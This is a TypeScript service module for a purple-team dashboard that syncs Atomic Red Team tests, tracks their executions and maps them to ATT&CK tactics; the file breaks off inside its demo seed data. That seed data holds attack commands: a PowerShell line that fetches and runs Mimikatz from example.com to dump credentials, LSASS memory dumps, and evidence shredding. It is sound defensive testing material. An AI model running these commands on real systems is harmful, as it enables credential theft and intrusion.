/**
 * Atomic Red Team Integration Module
 * 
 * Backend service that syncs 1,400+ ATT&CK-mapped atomic tests from GitHub,
 * provides cross-module integration hooks, and manages test execution tracking.
 * All tool complexity stays server-side — the UI consumes clean abstractions.
 */
import yaml from "js-yaml";
import { eq, sql, like, and, desc, inArray, count } from "drizzle-orm";
import { atomicTests, atomicTestExecutions } from "../../drizzle/schema";

// ─── Types ───────────────────────────────────────────────────────────────────

interface AtomicTestYaml {
  attack_technique: string;
  display_name: string;
  atomic_tests: Array<{
    name: string;
    auto_generated_guid: string;
    description: string;
    supported_platforms: string[];
    input_arguments?: Record<string, { description: string; type: string; default: any }>;
    executor: { name: string; command?: string; cleanup_command?: string; elevation_required?: boolean };
    dependencies?: Array<{ description: string; prereq_command: string; get_prereq_command: string }>;
    dependency_executor_name?: string;
    elevation_required?: boolean;
  }>;
}

export interface AtomicTestRecord {
  id: number;
  guid: string;
  techniqueId: string;
  techniqueName: string;
  testName: string;
  description: string | null;
  supportedPlatforms: string | null;
  executorType: string | null;
  executorCommand: string | null;
  cleanupCommand: string | null;
  elevationRequired: boolean | null;
  inputArguments: string | null;
  dependencies: string | null;
  mitreTactic: string | null;
}

export interface TechniqueCoverage {
  techniqueId: string;
  techniqueName: string;
  tactic: string;
  testCount: number;
  executionCount: number;
  lastExecuted: Date | null;
  platforms: string[];
}

export interface CrossModuleMatch {
  techniqueId: string;
  techniqueName: string;
  atomicTests: Array<{ guid: string; testName: string; platforms: string[]; executorType: string }>;
  relevance: string;
}

// ─── MITRE ATT&CK Tactic Mapping ────────────────────────────────────────────

const TECHNIQUE_TO_TACTIC: Record<string, string> = {
  "T1595": "Reconnaissance", "T1592": "Reconnaissance", "T1589": "Reconnaissance",
  "T1590": "Reconnaissance", "T1591": "Reconnaissance", "T1598": "Reconnaissance",
  "T1597": "Reconnaissance", "T1596": "Reconnaissance", "T1593": "Reconnaissance",
  "T1594": "Reconnaissance",
  "T1583": "Resource Development", "T1586": "Resource Development", "T1584": "Resource Development",
  "T1587": "Resource Development", "T1585": "Resource Development", "T1588": "Resource Development",
  "T1608": "Resource Development",
  "T1189": "Initial Access", "T1190": "Initial Access", "T1133": "Initial Access",
  "T1200": "Initial Access", "T1566": "Initial Access", "T1091": "Initial Access",
  "T1195": "Initial Access", "T1199": "Initial Access", "T1078": "Initial Access",
  "T1059": "Execution", "T1203": "Execution", "T1559": "Execution",
  "T1106": "Execution", "T1053": "Execution", "T1129": "Execution",
  "T1072": "Execution", "T1569": "Execution", "T1204": "Execution",
  "T1047": "Execution",
  "T1098": "Persistence", "T1197": "Persistence", "T1547": "Persistence",
  "T1037": "Persistence", "T1176": "Persistence", "T1554": "Persistence",
  "T1136": "Persistence", "T1543": "Persistence", "T1546": "Persistence",
  "T1133": "Persistence", "T1574": "Persistence", "T1525": "Persistence",
  "T1556": "Persistence", "T1137": "Persistence", "T1542": "Persistence",
  "T1053": "Persistence", "T1505": "Persistence", "T1205": "Persistence",
  "T1078": "Persistence",
  "T1548": "Privilege Escalation", "T1134": "Privilege Escalation",
  "T1547": "Privilege Escalation", "T1037": "Privilege Escalation",
  "T1543": "Privilege Escalation", "T1484": "Privilege Escalation",
  "T1546": "Privilege Escalation", "T1068": "Privilege Escalation",
  "T1574": "Privilege Escalation", "T1055": "Privilege Escalation",
  "T1053": "Privilege Escalation", "T1078": "Privilege Escalation",
  "T1548": "Defense Evasion", "T1134": "Defense Evasion", "T1197": "Defense Evasion",
  "T1140": "Defense Evasion", "T1006": "Defense Evasion", "T1480": "Defense Evasion",
  "T1211": "Defense Evasion", "T1222": "Defense Evasion", "T1564": "Defense Evasion",
  "T1562": "Defense Evasion", "T1070": "Defense Evasion", "T1202": "Defense Evasion",
  "T1036": "Defense Evasion", "T1556": "Defense Evasion", "T1578": "Defense Evasion",
  "T1112": "Defense Evasion", "T1601": "Defense Evasion", "T1599": "Defense Evasion",
  "T1027": "Defense Evasion", "T1542": "Defense Evasion", "T1055": "Defense Evasion",
  "T1207": "Defense Evasion", "T1014": "Defense Evasion", "T1218": "Defense Evasion",
  "T1216": "Defense Evasion", "T1553": "Defense Evasion", "T1221": "Defense Evasion",
  "T1205": "Defense Evasion", "T1127": "Defense Evasion", "T1535": "Defense Evasion",
  "T1550": "Defense Evasion", "T1078": "Defense Evasion", "T1497": "Defense Evasion",
  "T1600": "Defense Evasion", "T1220": "Defense Evasion",
  "T1557": "Credential Access", "T1110": "Credential Access", "T1555": "Credential Access",
  "T1212": "Credential Access", "T1187": "Credential Access", "T1606": "Credential Access",
  "T1056": "Credential Access", "T1556": "Credential Access", "T1111": "Credential Access",
  "T1621": "Credential Access", "T1040": "Credential Access", "T1003": "Credential Access",
  "T1528": "Credential Access", "T1558": "Credential Access", "T1539": "Credential Access",
  "T1552": "Credential Access",
  "T1087": "Discovery", "T1010": "Discovery", "T1217": "Discovery",
  "T1580": "Discovery", "T1538": "Discovery", "T1526": "Discovery",
  "T1482": "Discovery", "T1083": "Discovery", "T1046": "Discovery",
  "T1135": "Discovery", "T1040": "Discovery", "T1201": "Discovery",
  "T1120": "Discovery", "T1069": "Discovery", "T1057": "Discovery",
  "T1012": "Discovery", "T1018": "Discovery", "T1518": "Discovery",
  "T1082": "Discovery", "T1016": "Discovery", "T1049": "Discovery",
  "T1033": "Discovery", "T1007": "Discovery", "T1124": "Discovery",
  "T1497": "Discovery",
  "T1210": "Lateral Movement", "T1534": "Lateral Movement",
  "T1570": "Lateral Movement", "T1563": "Lateral Movement",
  "T1021": "Lateral Movement", "T1091": "Lateral Movement",
  "T1072": "Lateral Movement", "T1080": "Lateral Movement",
  "T1550": "Lateral Movement",
  "T1560": "Collection", "T1123": "Collection", "T1119": "Collection",
  "T1115": "Collection", "T1530": "Collection", "T1602": "Collection",
  "T1213": "Collection", "T1005": "Collection", "T1039": "Collection",
  "T1025": "Collection", "T1074": "Collection", "T1114": "Collection",
  "T1056": "Collection", "T1185": "Collection", "T1557": "Collection",
  "T1113": "Collection", "T1125": "Collection",
  "T1071": "Command and Control", "T1132": "Command and Control",
  "T1001": "Command and Control", "T1568": "Command and Control",
  "T1573": "Command and Control", "T1008": "Command and Control",
  "T1105": "Command and Control", "T1104": "Command and Control",
  "T1095": "Command and Control", "T1571": "Command and Control",
  "T1572": "Command and Control", "T1090": "Command and Control",
  "T1219": "Command and Control", "T1205": "Command and Control",
  "T1102": "Command and Control",
  "T1020": "Exfiltration", "T1030": "Exfiltration", "T1048": "Exfiltration",
  "T1041": "Exfiltration", "T1011": "Exfiltration", "T1052": "Exfiltration",
  "T1567": "Exfiltration", "T1029": "Exfiltration", "T1537": "Exfiltration",
  "T1531": "Impact", "T1485": "Impact", "T1486": "Impact",
  "T1565": "Impact", "T1491": "Impact", "T1561": "Impact",
  "T1499": "Impact", "T1495": "Impact", "T1490": "Impact",
  "T1498": "Impact", "T1496": "Impact", "T1489": "Impact",
  "T1529": "Impact",
};

function getTacticForTechnique(techniqueId: string): string {
  // Strip sub-technique (T1059.001 → T1059)
  const parent = techniqueId.split(".")[0];
  return TECHNIQUE_TO_TACTIC[parent] || "Unknown";
}

// ─── Database Helper ─────────────────────────────────────────────────────────

let _db: any = null;
async function getDb() {
  if (!_db) {
    const mod = await import("../db");
    _db = (mod as any).db || (mod as any).default;
    if (typeof _db === "function") _db = await _db();
  }
  return _db;
}

// ─── GitHub Sync ─────────────────────────────────────────────────────────────

const GITHUB_RAW_BASE = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics";
const GITHUB_API_BASE = "https://api.github.com/repos/redcanaryco/atomic-red-team/contents/atomics";

/**
 * Fetch the index of all technique directories from GitHub.
 */
async function fetchTechniqueIndex(): Promise<string[]> {
  const resp = await fetch(GITHUB_API_BASE, {
    headers: { "Accept": "application/vnd.github.v3+json", "User-Agent": "CalderaDashboard/1.0" },
    signal: AbortSignal.timeout(30000),
  });
  if (!resp.ok) throw new Error(`GitHub API error: ${resp.status}`);
  const items: Array<{ name: string; type: string }> = await resp.json();
  return items
    .filter(i => i.type === "dir" && /^T\d{4}/.test(i.name))
    .map(i => i.name);
}

/**
 * Fetch and parse a single technique's YAML file.
 */
async function fetchTechniqueYaml(techniqueId: string): Promise<AtomicTestYaml | null> {
  try {
    const url = `${GITHUB_RAW_BASE}/${techniqueId}/${techniqueId}.yaml`;
    const resp = await fetch(url, {
      headers: { "User-Agent": "CalderaDashboard/1.0" },
      signal: AbortSignal.timeout(15000),
    });
    if (!resp.ok) return null;
    const text = await resp.text();
    return yaml.load(text) as AtomicTestYaml;
  } catch {
    return null;
  }
}

/**
 * Sync all Atomic Red Team tests from GitHub into the database.
 * Returns the count of tests synced.
 */
export async function syncFromGitHub(options?: {
  techniques?: string[];
  forceRefresh?: boolean;
}): Promise<{ synced: number; errors: string[]; techniques: number }> {
  const db = await getDb();
  if (!db) throw new Error("Database unavailable");

  const errors: string[] = [];
  let synced = 0;

  // Get technique list
  let techniques: string[];
  if (options?.techniques?.length) {
    techniques = options.techniques;
  } else {
    techniques = await fetchTechniqueIndex();
  }

  // Process in batches of 10 to avoid rate limits
  const batchSize = 10;
  for (let i = 0; i < techniques.length; i += batchSize) {
    const batch = techniques.slice(i, i + batchSize);
    const results = await Promise.allSettled(
      batch.map(tid => fetchTechniqueYaml(tid))
    );

    for (let j = 0; j < results.length; j++) {
      const result = results[j];
      const tid = batch[j];

      if (result.status === "rejected") {
        errors.push(`${tid}: ${result.reason}`);
        continue;
      }

      const yamlData = result.value;
      if (!yamlData?.atomic_tests) continue;

      for (const test of yamlData.atomic_tests) {
        try {
          const tactic = getTacticForTechnique(yamlData.attack_technique);
          const values = {
            guid: test.auto_generated_guid,
            techniqueId: yamlData.attack_technique,
            techniqueName: yamlData.display_name,
            testName: test.name,
            description: test.description || null,
            supportedPlatforms: (test.supported_platforms || []).join(","),
            executorType: test.executor?.name || null,
            executorCommand: test.executor?.command || null,
            cleanupCommand: test.executor?.cleanup_command || null,
            elevationRequired: test.elevation_required || test.executor?.elevation_required || false,
            inputArguments: test.input_arguments ? JSON.stringify(test.input_arguments) : null,
            dependencies: test.dependencies ? JSON.stringify(test.dependencies) : null,
            mitreTactic: tactic,
            lastSyncedAt: new Date(),
          };

          // Upsert: insert or update on duplicate guid
          await db.insert(atomicTests).values(values)
            .onDuplicateKeyUpdate({ set: { ...values } });
          synced++;
        } catch (err: any) {
          errors.push(`${tid}/${test.auto_generated_guid}: ${err.message}`);
        }
      }
    }

    // Brief pause between batches to respect rate limits
    if (i + batchSize < techniques.length) {
      await new Promise(r => setTimeout(r, 500));
    }
  }

  return { synced, errors: errors.slice(0, 50), techniques: techniques.length };
}

// ─── Test Browsing & Search ──────────────────────────────────────────────────

/**
 * List all synced tests with optional filters.
 */
export async function listTests(filters?: {
  techniqueId?: string;
  tactic?: string;
  platform?: string;
  executorType?: string;
  search?: string;
  limit?: number;
  offset?: number;
}): Promise<{ tests: AtomicTestRecord[]; total: number }> {
  const db = await getDb();
  if (!db) throw new Error("Database unavailable");

  const conditions: any[] = [];
  if (filters?.techniqueId) conditions.push(eq(atomicTests.techniqueId, filters.techniqueId));
  if (filters?.tactic) conditions.push(eq(atomicTests.mitreTactic, filters.tactic));
  if (filters?.platform) conditions.push(like(atomicTests.supportedPlatforms, `%${filters.platform}%`));
  if (filters?.executorType) conditions.push(eq(atomicTests.executorType, filters.executorType));
  if (filters?.search) {
    conditions.push(
      sql`(${atomicTests.testName} LIKE ${`%${filters.search}%`} OR ${atomicTests.techniqueName} LIKE ${`%${filters.search}%`} OR ${atomicTests.techniqueId} LIKE ${`%${filters.search}%`} OR ${atomicTests.description} LIKE ${`%${filters.search}%`})`
    );
  }

  const where = conditions.length > 0 ? and(...conditions) : undefined;

  const [tests, totalResult] = await Promise.all([
    db.select().from(atomicTests)
      .where(where)
      .orderBy(atomicTests.techniqueId)
      .limit(filters?.limit || 50)
      .offset(filters?.offset || 0),
    db.select({ count: count() }).from(atomicTests).where(where),
  ]);

  return { tests, total: totalResult[0]?.count || 0 };
}

/**
 * Get a single test by GUID.
 */
export async function getTestByGuid(guid: string): Promise<AtomicTestRecord | null> {
  const db = await getDb();
  if (!db) throw new Error("Database unavailable");
  const [test] = await db.select().from(atomicTests).where(eq(atomicTests.guid, guid)).limit(1);
  return test || null;
}

/**
 * Get all tests for a specific technique.
 */
export async function getTestsForTechnique(techniqueId: string): Promise<AtomicTestRecord[]> {
  const db = await getDb();
  if (!db) throw new Error("Database unavailable");
  return db.select().from(atomicTests).where(eq(atomicTests.techniqueId, techniqueId));
}

// ─── Coverage & Statistics ───────────────────────────────────────────────────

/**
 * Get ATT&CK technique coverage — how many tests exist per technique,
 * plus execution history.
 */
export async function getTechniqueCoverage(): Promise<TechniqueCoverage[]> {
  const db = await getDb();
  if (!db) throw new Error("Database unavailable");

  const tests = await db.select({
    techniqueId: atomicTests.techniqueId,
    techniqueName: atomicTests.techniqueName,
    tactic: atomicTests.mitreTactic,
    platforms: atomicTests.supportedPlatforms,
  }).from(atomicTests);

  // Group by technique
  const techniqueMap = new Map<string, {
    techniqueName: string;
    tactic: string;
    testCount: number;
    platforms: Set<string>;
  }>();

  for (const t of tests) {
    const existing = techniqueMap.get(t.techniqueId);
    if (existing) {
      existing.testCount++;
      (t.platforms || "").split(",").forEach((p: string) => p && existing.platforms.add(p));
    } else {
      const platforms = new Set<string>();
      (t.platforms || "").split(",").forEach((p: string) => p && platforms.add(p));
      techniqueMap.set(t.techniqueId, {
        techniqueName: t.techniqueName,
        tactic: t.tactic || "Unknown",
        testCount: 1,
        platforms,
      });
    }
  }

  // Get execution counts per technique
  const executions = await db.select({
    techniqueId: atomicTestExecutions.techniqueId,
    execCount: count(),
    lastExec: sql`MAX(${atomicTestExecutions.completedAt})`,
  }).from(atomicTestExecutions)
    .groupBy(atomicTestExecutions.techniqueId);

  const execMap = new Map(executions.map((e: any) => [e.techniqueId, { count: e.execCount, lastExec: e.lastExec }]));

  const coverage: TechniqueCoverage[] = [];
  for (const [tid, data] of techniqueMap) {
    const exec = execMap.get(tid);
    coverage.push({
      techniqueId: tid,
      techniqueName: data.techniqueName,
      tactic: data.tactic,
      testCount: data.testCount,
      executionCount: exec?.count || 0,
      lastExecuted: exec?.lastExec || null,
      platforms: Array.from(data.platforms),
    });
  }

  return coverage.sort((a, b) => a.techniqueId.localeCompare(b.techniqueId));
}

/**
 * Get overall stats for the Atomic Red Team library.
 */
export async function getStats(): Promise<{
  totalTests: number;
  totalTechniques: number;
  totalExecutions: number;
  successfulExecutions: number;
  failedExecutions: number;
  detectionTriggered: number;
  tacticDistribution: Record<string, number>;
  platformDistribution: Record<string, number>;
  executorDistribution: Record<string, number>;
  recentExecutions: any[];
}> {
  const db = await getDb();
  if (!db) throw new Error("Database unavailable");

  const [totalTests] = await db.select({ count: count() }).from(atomicTests);
  const [totalTechniques] = await db.select({ count: sql`COUNT(DISTINCT ${atomicTests.techniqueId})` }).from(atomicTests);
  const [totalExec] = await db.select({ count: count() }).from(atomicTestExecutions);
  const [successExec] = await db.select({ count: count() }).from(atomicTestExecutions).where(eq(atomicTestExecutions.status, "success"));
  const [failedExec] = await db.select({ count: count() }).from(atomicTestExecutions).where(eq(atomicTestExecutions.status, "failed"));
  const [detectedExec] = await db.select({ count: count() }).from(atomicTestExecutions).where(eq(atomicTestExecutions.detectionTriggered, true));

  // Tactic distribution
  const tactics = await db.select({
    tactic: atomicTests.mitreTactic,
    count: count(),
  }).from(atomicTests).groupBy(atomicTests.mitreTactic);
  const tacticDistribution: Record<string, number> = {};
  for (const t of tactics) tacticDistribution[t.tactic || "Unknown"] = t.count;

  // Platform distribution
  const allTests = await db.select({ platforms: atomicTests.supportedPlatforms }).from(atomicTests);
  const platformDistribution: Record<string, number> = {};
  for (const t of allTests) {
    for (const p of (t.platforms || "").split(",")) {
      if (p) platformDistribution[p] = (platformDistribution[p] || 0) + 1;
    }
  }

  // Executor distribution
  const executors = await db.select({
    executor: atomicTests.executorType,
    count: count(),
  }).from(atomicTests).groupBy(atomicTests.executorType);
  const executorDistribution: Record<string, number> = {};
  for (const e of executors) executorDistribution[e.executor || "unknown"] = e.count;

  // Recent executions
  const recentExecutions = await db.select().from(atomicTestExecutions)
    .orderBy(desc(atomicTestExecutions.createdAt))
    .limit(10);

  return {
    totalTests: totalTests?.count || 0,
    totalTechniques: totalTechniques?.count || 0,
    totalExecutions: totalExec?.count || 0,
    successfulExecutions: successExec?.count || 0,
    failedExecutions: failedExec?.count || 0,
    detectionTriggered: detectedExec?.count || 0,
    tacticDistribution,
    platformDistribution,
    executorDistribution,
    recentExecutions,
  };
}

// ─── Execution Tracking ──────────────────────────────────────────────────────

/**
 * Record a test execution (queued state).
 */
export async function createExecution(params: {
  atomicTestId: number;
  guid: string;
  techniqueId: string;
  testName: string;
  executedBy: string;
  targetHost?: string;
  targetPlatform?: string;
  executorType?: string;
  commandExecuted?: string;
  inputArgs?: Record<string, any>;
  attackChainId?: string;
  calderaOperationId?: string;
}): Promise<number> {
  const db = await getDb();
  if (!db) throw new Error("Database unavailable");

  const [result] = await db.insert(atomicTestExecutions).values({
    atomicTestId: params.atomicTestId,
    guid: params.guid,
    techniqueId: params.techniqueId,
    testName: params.testName,
    executedBy: params.executedBy,
    targetHost: params.targetHost || null,
    targetPlatform: params.targetPlatform || null,
    status: "queued",
    executorType: params.executorType || null,
    commandExecuted: params.commandExecuted || null,
    inputArgs: params.inputArgs ? JSON.stringify(params.inputArgs) : null,
    attackChainId: params.attackChainId || null,
    calderaOperationId: params.calderaOperationId || null,
    startedAt: new Date(),
  });

  return (result as any).insertId;
}

/**
 * Update execution status and results.
 */
export async function updateExecution(executionId: number, update: {
  status?: "running" | "success" | "failed" | "blocked" | "cleanup";
  stdout?: string;
  stderr?: string;
  exitCode?: number;
  detectionTriggered?: boolean;
  detectionDetails?: string;
  cleanupRan?: boolean;
  cleanupOutput?: string;
  durationMs?: number;
  completedAt?: Date;
}): Promise<void> {
  const db = await getDb();
  if (!db) throw new Error("Database unavailable");
  await db.update(atomicTestExecutions).set(update).where(eq(atomicTestExecutions.id, executionId));
}

/**
 * List execution history with optional filters.
 */
export async function listExecutions(filters?: {
  techniqueId?: string;
  status?: string;
  attackChainId?: string;
  limit?: number;
  offset?: number;
}): Promise<{ executions: any[]; total: number }> {
  const db = await getDb();
  if (!db) throw new Error("Database unavailable");

  const conditions: any[] = [];
  if (filters?.techniqueId) conditions.push(eq(atomicTestExecutions.techniqueId, filters.techniqueId));
  if (filters?.status) conditions.push(eq(atomicTestExecutions.status, filters.status as any));
  if (filters?.attackChainId) conditions.push(eq(atomicTestExecutions.attackChainId, filters.attackChainId));

  const where = conditions.length > 0 ? and(...conditions) : undefined;

  const [executions, totalResult] = await Promise.all([
    db.select().from(atomicTestExecutions)
      .where(where)
      .orderBy(desc(atomicTestExecutions.createdAt))
      .limit(filters?.limit || 50)
      .offset(filters?.offset || 0),
    db.select({ count: count() }).from(atomicTestExecutions).where(where),
  ]);

  return { executions, total: totalResult[0]?.count || 0 };
}

// ─── Cross-Module Integration Service ────────────────────────────────────────

/**
 * Find atomic tests matching a set of ATT&CK technique IDs.
 * Used by: Attack Planner, Emulation Playbooks, Purple Team, Detection Rules, EDR Validation
 */
export async function findTestsForTechniques(techniqueIds: string[]): Promise<CrossModuleMatch[]> {
  const db = await getDb();
  if (!db) throw new Error("Database unavailable");
  if (!techniqueIds.length) return [];

  // Expand sub-techniques: if T1059.001 is requested, also match T1059
  const expandedIds = new Set<string>();
  for (const tid of techniqueIds) {
    expandedIds.add(tid);
    if (tid.includes(".")) expandedIds.add(tid.split(".")[0]);
  }

  const tests = await db.select().from(atomicTests)
    .where(inArray(atomicTests.techniqueId, Array.from(expandedIds)));

  // Group by technique
  const grouped = new Map<string, CrossModuleMatch>();
  for (const test of tests) {
    const existing = grouped.get(test.techniqueId);
    const testInfo = {
      guid: test.guid,
      testName: test.testName,
      platforms: (test.supportedPlatforms || "").split(",").filter(Boolean),
      executorType: test.executorType || "unknown",
    };
    if (existing) {
      existing.atomicTests.push(testInfo);
    } else {
      grouped.set(test.techniqueId, {
        techniqueId: test.techniqueId,
        techniqueName: test.techniqueName,
        atomicTests: [testInfo],
        relevance: techniqueIds.includes(test.techniqueId) ? "direct" : "parent_technique",
      });
    }
  }

  return Array.from(grouped.values());
}

/**
 * Find atomic tests that validate a specific detection rule.
 * Used by: Detection Rules, SIEM Connectors, EDR Validation
 */
export async function findTestsForDetectionRule(params: {
  mitreTechniqueIds?: string[];
  keywords?: string[];
  platform?: string;
}): Promise<AtomicTestRecord[]> {
  const db = await getDb();
  if (!db) throw new Error("Database unavailable");

  const conditions: any[] = [];
  if (params.mitreTechniqueIds?.length) {
    conditions.push(inArray(atomicTests.techniqueId, params.mitreTechniqueIds));
  }
  if (params.keywords?.length) {
    for (const kw of params.keywords) {
      conditions.push(
        sql`(${atomicTests.testName} LIKE ${`%${kw}%`} OR ${atomicTests.description} LIKE ${`%${kw}%`} OR ${atomicTests.executorCommand} LIKE ${`%${kw}%`})`
      );
    }
  }
  if (params.platform) {
    conditions.push(like(atomicTests.supportedPlatforms, `%${params.platform}%`));
  }

  if (!conditions.length) return [];

  return db.select().from(atomicTests)
    .where(and(...conditions))
    .limit(20);
}

/**
 * Map Caldera abilities to matching Atomic Red Team tests.
 * Used by: Caldera Operations, Emulation Playbooks
 */
export async function mapCalderaAbilities(abilities: Array<{
  abilityId: string;
  techniqueId: string;
  name: string;
}>): Promise<Array<{
  abilityId: string;
  abilityName: string;
  techniqueId: string;
  matchingAtomicTests: Array<{ guid: string; testName: string; platforms: string[] }>;
}>> {
  const techniqueIds = [...new Set(abilities.map(a => a.techniqueId))];
  const matches = await findTestsForTechniques(techniqueIds);
  const matchMap = new Map(matches.map(m => [m.techniqueId, m]));

  return abilities.map(ability => ({
    abilityId: ability.abilityId,
    abilityName: ability.name,
    techniqueId: ability.techniqueId,
    matchingAtomicTests: (matchMap.get(ability.techniqueId)?.atomicTests || []).map(t => ({
      guid: t.guid,
      testName: t.testName,
      platforms: t.platforms,
    })),
  }));
}

/**
 * Get atomic tests relevant to ZAP web vulnerability findings.
 * Used by: Web App Scanner, Corroboration Engine
 */
export async function findTestsForWebFindings(findings: Array<{
  mitreAttackId?: string | null;
  cweId?: number | null;
  alertName: string;
}>): Promise<Array<{
  alertName: string;
  mitreAttackId: string | null;
  matchingAtomicTests: Array<{ guid: string; testName: string; techniqueId: string }>;
}>> {
  const techniqueIds = findings
    .map(f => f.mitreAttackId)
    .filter((id): id is string => !!id);

  const matches = await findTestsForTechniques([...new Set(techniqueIds)]);
  const matchMap = new Map(matches.map(m => [m.techniqueId, m]));

  return findings.map(finding => ({
    alertName: finding.alertName,
    mitreAttackId: finding.mitreAttackId || null,
    matchingAtomicTests: finding.mitreAttackId
      ? (matchMap.get(finding.mitreAttackId)?.atomicTests || []).map(t => ({
          guid: t.guid,
          testName: t.testName,
          techniqueId: finding.mitreAttackId!,
        }))
      : [],
  }));
}

/**
 * Generate a purple team exercise plan using atomic tests.
 * Used by: Purple Team, Attack Planner
 */
export async function generatePurpleTeamPlan(params: {
  techniqueIds: string[];
  targetPlatform?: string;
  includeCleanup?: boolean;
}): Promise<Array<{
  step: number;
  techniqueId: string;
  techniqueName: string;
  tactic: string;
  test: { guid: string; testName: string; command: string; cleanup: string | null; platforms: string[] };
}>> {
  const matches = await findTestsForTechniques(params.techniqueIds);
  const plan: Array<any> = [];
  let step = 1;

  for (const match of matches) {
    for (const test of match.atomicTests) {
      // Get full test details
      const fullTest = await getTestByGuid(test.guid);
      if (!fullTest) continue;

      // Filter by platform if specified
      if (params.targetPlatform) {
        const platforms = (fullTest.supportedPlatforms || "").split(",");
        if (!platforms.includes(params.targetPlatform)) continue;
      }

      plan.push({
        step: step++,
        techniqueId: match.techniqueId,
        techniqueName: match.techniqueName,
        tactic: getTacticForTechnique(match.techniqueId),
        test: {
          guid: test.guid,
          testName: test.testName,
          command: fullTest.executorCommand || "",
          cleanup: params.includeCleanup ? fullTest.cleanupCommand : null,
          platforms: test.platforms,
        },
      });
    }
  }

  return plan;
}

// ─── Demo Data ───────────────────────────────────────────────────────────────

/**
 * Seed demo atomic tests (for when GitHub sync hasn't run yet).
 */
export async function seedDemoData(): Promise<{ seeded: number }> {
  const db = await getDb();
  if (!db) throw new Error("Database unavailable");

  const demoTests = [
    { guid: "demo-f3132740", techniqueId: "T1059.001", techniqueName: "Command and Scripting Interpreter: PowerShell", testName: "[DEMO] Mimikatz Credential Dump", description: "Download Mimikatz and dump credentials from memory.", supportedPlatforms: "windows", executorType: "command_prompt", executorCommand: 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(\'https://example.com/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds"', elevationRequired: true, mitreTactic: "Execution" },
    { guid: "demo-a21bb23e", techniqueId: "T1059.001", techniqueName: "Command and Scripting Interpreter: PowerShell", testName: "[DEMO] BloodHound AD Enumeration", description: "Run SharpHound to enumerate Active Directory attack paths.", supportedPlatforms: "windows", executorType: "powershell", executorCommand: 'import-module SharpHound.ps1; Invoke-BloodHound -OutputDirectory $env:Temp', cleanupCommand: 'Remove-Item $env:Temp\\*BloodHound.zip -Force', elevationRequired: false, mitreTactic: "Execution" },
    { guid: "demo-5a209c5b", techniqueId: "T1003.001", techniqueName: "OS Credential Dumping: LSASS Memory", testName: "[DEMO] Dump LSASS with comsvcs.dll", description: "Use comsvcs.dll MiniDump to dump LSASS process memory.", supportedPlatforms: "windows", executorType: "command_prompt", executorCommand: 'rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass.dmp full', cleanupCommand: 'del $env:TEMP\\lsass.dmp', elevationRequired: true, mitreTactic: "Credential Access" },
    { guid: "demo-c5ecb42e", techniqueId: "T1003.001", techniqueName: "OS Credential Dumping: LSASS Memory", testName: "[DEMO] Procdump LSASS Dump", description: "Use Sysinternals ProcDump to create a memory dump of LSASS.", supportedPlatforms: "windows", executorType: "command_prompt", executorCommand: 'procdump.exe -accepteula -ma lsass.exe %temp%\\lsass.dmp', cleanupCommand: 'del %temp%\\lsass.dmp', elevationRequired: true, mitreTactic: "Credential Access" },
    { guid: "demo-e372d1f0", techniqueId: "T1087.001", techniqueName: "Account Discovery: Local Account", testName: "[DEMO] Enumerate Local Users (Linux)", description: "List all local user accounts on a Linux system.", supportedPlatforms: "linux", executorType: "bash", executorCommand: 'cat /etc/passwd', elevationRequired: false, mitreTactic: "Discovery" },
    { guid: "demo-b8c4f2a1", techniqueId: "T1087.002", techniqueName: "Account Discovery: Domain Account", testName: "[DEMO] AD Domain User Enumeration", description: "Enumerate domain user accounts via net user /domain.", supportedPlatforms: "windows", executorType: "command_prompt", executorCommand: 'net user /domain', elevationRequired: false, mitreTactic: "Discovery" },
    { guid: "demo-d9e5a3b2", techniqueId: "T1082", techniqueName: "System Information Discovery", testName: "[DEMO] System Information Gathering (Linux)", description: "Collect system information using standard Linux commands.", supportedPlatforms: "linux,macos", executorType: "bash", executorCommand: 'uname -a && cat /etc/os-release && hostname && id', elevationRequired: false, mitreTactic: "Discovery" },
    { guid: "demo-f1a2b3c4", techniqueId: "T1082", techniqueName: "System Information Discovery", testName: "[DEMO] Windows System Info", description: "Gather Windows system information using systeminfo.", supportedPlatforms: "windows", executorType: "command_prompt", executorCommand: 'systeminfo', elevationRequired: false, mitreTactic: "Discovery" },
    { guid: "demo-a1b2c3d4", techniqueId: "T1046", techniqueName: "Network Service Discovery", testName: "[DEMO] Nmap Port Scan", description: "Perform a network service scan using nmap.", supportedPlatforms: "linux,windows,macos", executorType: "bash", executorCommand: 'nmap -sV -p 1-1000 #{target_host}', inputArguments: JSON.stringify({ target_host: { description: "Target host to scan", type: "string", default: "192.168.1.1" } }), elevationRequired: false, mitreTactic: "Discovery" },
    { guid: "demo-e5f6a7b8", techniqueId: "T1021.001", techniqueName: "Remote Services: Remote Desktop Protocol", testName: "[DEMO] RDP Connection Test", description: "Attempt RDP connection to validate lateral movement capability.", supportedPlatforms: "windows", executorType: "powershell", executorCommand: 'mstsc /v:#{target_host}', inputArguments: JSON.stringify({ target_host: { description: "Target RDP host", type: "string", default: "192.168.1.100" } }), elevationRequired: false, mitreTactic: "Lateral Movement" },
    { guid: "demo-c9d0e1f2", techniqueId: "T1055.001", techniqueName: "Process Injection: Dynamic-link Library Injection", testName: "[DEMO] DLL Injection via CreateRemoteThread", description: "Inject a DLL into a target process using CreateRemoteThread.", supportedPlatforms: "windows", executorType: "powershell", executorCommand: '$proc = Get-Process notepad; # DLL injection simulation', elevationRequired: true, mitreTactic: "Privilege Escalation" },
    { guid: "demo-g3h4i5j6", techniqueId: "T1070.004", techniqueName: "Indicator Removal: File Deletion", testName: "[DEMO] Secure File Deletion (Linux)", description: "Securely delete files to remove forensic evidence.", supportedPlatforms: "linux,macos", executorType: "bash", executorCommand: 'shred -u #{file_path}', inputArguments: JSON.stringify({ file_path: { description: "File to securely delete", type: "path", default: "/tmp/evidence.txt" } }), cleanupCommand: null, elevationRequired: false, mitreTactic: "Defense Evasion" },
    { guid: "demo-k7l8m9n0", techniqueId: "T1486", techniqueName: "Data Encrypted for Impact", testName: "[DEMO] Ransomware Simulation (Safe)", description: "Simulate ransomware encryption on test files only.", supportedPlatforms: "windows,linux", executorType: "powershell", executorCommand: '# Safe simulation - encrypts only test directory files', cleanupCommand: '# Decrypt test files', elevationRequired: false, mitreTactic: "Impact" },
